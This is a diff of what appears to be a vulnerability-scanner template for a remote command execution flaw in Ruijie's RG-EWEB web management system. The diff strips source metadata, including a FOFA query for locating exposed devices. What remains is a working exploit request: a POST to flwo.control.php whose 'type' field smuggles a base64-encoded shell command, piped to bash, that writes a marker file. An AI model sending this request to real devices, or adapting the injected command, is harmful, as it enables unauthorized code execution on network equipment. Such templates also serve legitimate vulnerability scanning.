@@ -3,12 +3,8 @@ info:
   name: 锐捷RG-EWEB-flwo.contro-远程命令执行
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/idf3gw6iifguwiyp'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: idf3gw6iifguwiyp
-    fofa: title="锐捷网络-EWEB网管系统"
 http:
 - raw:
   - 'POST /flow_control_pi/flwo.control.php?a=getFlowGroup HTTP/1.1
@@ -24,8 +20,6 @@ http:
 
 
     Accept-Encoding: gzip
-
-
 
 
     type=%7Cbash+-c+%27echo+cm0gLXJmIC4uL2lrbTEyMy50eHQgJiYgZWNobyBIZWxsb1dvcmxkID4gLi4vaWttMTIzLnR4dCAyPiYx+%7C+base64+-d+%7C+bash+%26%26+exit+0%27
